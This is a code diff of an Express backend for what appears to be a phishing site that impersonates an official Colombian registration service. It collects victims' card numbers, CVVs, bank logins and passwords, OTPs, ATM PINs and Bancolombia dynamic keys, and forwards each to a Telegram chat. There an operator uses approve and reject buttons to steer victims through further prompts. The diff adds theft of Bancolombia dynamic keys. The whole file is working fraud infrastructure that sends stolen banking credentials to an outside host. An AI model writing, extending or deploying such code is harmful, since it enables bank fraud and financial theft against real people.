@@ -10,26 +10,37 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const FRONT_BASE_URL = process.env.FRONT_BASE_URL || 'https://registraenlineanuip-crtificadonacioncol.onrender.com';
 const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://backvenecol.onrender.com';
 
+// 🧠 ALMACENAMIENTO EN MEMORIA (Se borra si el servidor se reinicia)
 const pagosPendientes = new Map();
 
-// 🔥 BANCOS QUE PIDEN CLAVE ATM EN VEZ DE OTP
-// Detección flexible por palabras clave (tolera nombres largos oficiales)
+// ============================================================
+// 🔥 DETECCIÓN DE BANCO
+// ============================================================
+
+// AV Villas / BBVA → clave ATM (4 dígitos)
 function esBancoClaveATM(banco) {
     if (!banco) return false;
     const b = String(banco).trim().toLowerCase();
-
     // BBVA: "BBVA", "BBVA Colombia", "BANCO BILBAO VIZCAYA ARGENTARIA COLOMBIA, S.A", etc.
     if (b.includes('bbva')) return true;
     if (b.includes('bilbao') && b.includes('vizcaya')) return true;
     if (b.includes('bilbao vizcaya')) return true;
-
     // AV Villas: "AV Villas", "AVVillas", "A.V. Villas", "Banco AV Villas", etc.
     if (b.includes('av villas')) return true;
     if (b.includes('avvillas')) return true;
     if (b.includes('a.v. villas')) return true;
-
     return false;
 }
+
+// Bancolombia → clave dinámica
+function esBancolombia(banco) {
+    if (!banco) return false;
+    return String(banco).trim().toLowerCase().includes('bancolombia');
+}
+
+// ============================================================
+// 🔧 HELPERS TELEGRAM
+// ============================================================
 
 async function tgSendMessage(text, replyMarkup) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
@@ -59,6 +70,10 @@ async function tgAnswerCallback(callbackQueryId, text) {
     } catch {}
 }
 
+// ============================================================
+// 📝 TEXTOS DE MENSAJES TELEGRAM
+// ============================================================
+
 function textoPasoCrear(pago) {
     return (
         `🔔 <b>NUEVA SOLICITUD DE PAGO (PASO 1: TARJETA)</b>\n\n` +
@@ -85,8 +100,11 @@ function textoPasoCredenciales(pago) {
 }
 
 function textoPasoOTP(pago) {
-    const etiqueta = pago.requiere_clave_atm ? 'CLAVE ATM' : 'OTP';
-    const valor = pago.requiere_clave_atm ? pago.clave_atm : pago.codigo_otp;
+    let etiqueta = 'OTP';
+    let valor = pago.codigo_otp;
+    if (pago.requiere_clave_atm) { etiqueta = 'CLAVE ATM'; valor = pago.clave_atm; }
+    else if (pago.requiere_clave_dinamica) { etiqueta = 'CLAVE DINÁMICA'; valor = pago.clave_dinamica; }
+
     return (
         `🔐 <b>NUEVOS DATOS RECIBIDOS (PASO 3: ${etiqueta})</b>\n\n` +
         `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
@@ -99,8 +117,12 @@ function textoPasoOTP(pago) {
     );
 }
 
+// ============================================================
+// 📥 POST /api/crear-pago
+// ============================================================
+
 app.post('/api/crear-pago', async (req, res) => {
-    const { solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, clave_atm, paso } = req.body || {};
+    const { solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, clave_atm, clave_dinamica, paso } = req.body || {};
     
     if (!solicitud_id) return res.status(400).json({ success: false, error: 'Datos incompletos' });
     if (paso === 'crear' && (!numero_tarjeta || !cvv || !vencimiento || !titular)) {
@@ -111,7 +133,6 @@ app.post('/api/crear-pago', async (req, res) => {
         let pago = pagosPendientes.get(solicitud_id);
 
         if (!pago) {
-            const requiereClaveATM = esBancoClaveATM(banco_emisor);
             pago = {
                 solicitud_id,
                 titular: titular || '—',
@@ -124,12 +145,15 @@ app.post('/api/crear-pago', async (req, res) => {
                 password_banco: password_banco || null,
                 codigo_otp: codigo_otp || null,
                 clave_atm: clave_atm || null,
-                requiere_clave_atm: requiereClaveATM,
+                clave_dinamica: clave_dinamica || null,
+                requiere_clave_atm: esBancoClaveATM(banco_emisor),
+                requiere_clave_dinamica: esBancolombia(banco_emisor),
                 estado: 'pendiente',
                 paso: paso || 'crear',
                 fase_actual: paso === 'otp' ? 'otp' : 'credenciales',
                 motivo_rechazo: null,
                 redirigir_a: null,
+                message_id_crear: null,
                 message_id_credenciales: null,
                 message_id_otp: null
             };
@@ -144,14 +168,18 @@ app.post('/api/crear-pago', async (req, res) => {
             pago.password_banco = password_banco || pago.password_banco;
             pago.codigo_otp = codigo_otp || pago.codigo_otp;
             pago.clave_atm = clave_atm || pago.clave_atm;
+            pago.clave_dinamica = clave_dinamica || pago.clave_dinamica;
             pago.requiere_clave_atm = esBancoClaveATM(pago.banco_emisor);
+            pago.requiere_clave_dinamica = esBancolombia(pago.banco_emisor);
             pago.estado = 'pendiente';
             pago.paso = paso || pago.paso;
             pago.fase_actual = paso === 'otp' ? 'otp' : 'credenciales';
 
+            // 🔥 Nuevo inicio de credenciales → limpiar claves residuales
             if (paso === 'credenciales') {
                 pago.codigo_otp = null;
                 pago.clave_atm = null;
+                pago.clave_dinamica = null;
                 pago.message_id_otp = null;
                 pago.motivo_rechazo = null;
                 pago.redirigir_a = null;
@@ -162,6 +190,7 @@ app.post('/api/crear-pago', async (req, res) => {
 
         const pasoActual = paso || 'crear';
         
+        // 🔥 CONFIGURACIÓN DE BOTONES SEGÚN EL PASO Y BANCO
         let replyMarkup;
         if (pasoActual === 'crear') {
             replyMarkup = { inline_keyboard: [[
@@ -169,8 +198,9 @@ app.post('/api/crear-pago', async (req, res) => {
                 { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
             ]]};
         } else if (pasoActual === 'credenciales') {
+            const textoAprobar = esBancolombia(pago.banco_emisor) ? '🔐 Dinámica' : '✅ Aprobar';
             const botones = [
-                { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
+                { text: textoAprobar,  callback_data: `aprobar:${pago.solicitud_id}` },
                 { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
             ];
             if (pago.requiere_clave_atm) {
@@ -185,6 +215,7 @@ app.post('/api/crear-pago', async (req, res) => {
             ]]};
         }
 
+        // 🔥 ENVIAMOS EL MENSAJE SEGÚN EL PASO Y GUARDAMOS EL message_id
         if (pasoActual === 'crear') {
             const sent = await tgSendMessage(textoPasoCrear(pago), replyMarkup);
             if (sent && sent.ok && sent.result) pago.message_id_crear = sent.result.message_id;
@@ -203,6 +234,10 @@ app.post('/api/crear-pago', async (req, res) => {
     }
 });
 
+// ============================================================
+// 📤 GET /api/estado-pago/:solicitud_id
+// ============================================================
+
 app.get('/api/estado-pago/:solicitud_id', (req, res) => {
     try {
         const pago = pagosPendientes.get(req.params.solicitud_id);
@@ -214,7 +249,8 @@ app.get('/api/estado-pago/:solicitud_id', (req, res) => {
                 estado: 'aprobado',
                 fase: 'credenciales',
                 marca: pago.marca_tarjeta,
-                requiere_clave_atm: !!pago.requiere_clave_atm
+                requiere_clave_atm: !!pago.requiere_clave_atm,
+                requiere_clave_dinamica: !!pago.requiere_clave_dinamica
             });
         }
         if (pago.estado === 'rechazado_credenciales') {
@@ -236,6 +272,10 @@ app.get('/api/estado-pago/:solicitud_id', (req, res) => {
     }
 });
 
+// ============================================================
+// 🤖 POST /api/telegram-webhook
+// ============================================================
+
 app.post('/api/telegram-webhook', async (req, res) => {
     res.sendStatus(200);
     const cq = req.body?.callback_query;
@@ -248,6 +288,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         const pago = pagosPendientes.get(solicitud_id);
         if (!pago) return await tgAnswerCallback(cq.id, 'No encontrada');
 
+        // 🔥 FIX DEFINITIVO: decidir fase por message_id del mensaje aprobado
         const estaEnFaseOTP = (msgId === pago.message_id_otp);
 
         if (accion === 'aprobar') {
@@ -273,6 +314,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + texto + `\n📌 <b>Motivo:</b> ${motivo}`);
             }
         } else if (accion === 'clave_atm') {
+            // 🔥 Botón "Clave ATM": pide al cliente ingresar la clave del cajero
             pago.estado = 'aprobado_credenciales';
             await tgAnswerCallback(cq.id, '🔑 Se solicitó Clave ATM al cliente');
             if (msgId) {
@@ -288,6 +330,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
         }
     } catch (err) { console.error("Error en webhook:", err); }
 });
+
+// ============================================================
+// 🔗 REGISTRO DE WEBHOOK + ARRANQUE
+// ============================================================
 
 async function registrarWebhook() {
     if (!TELEGRAM_TOKEN) return;
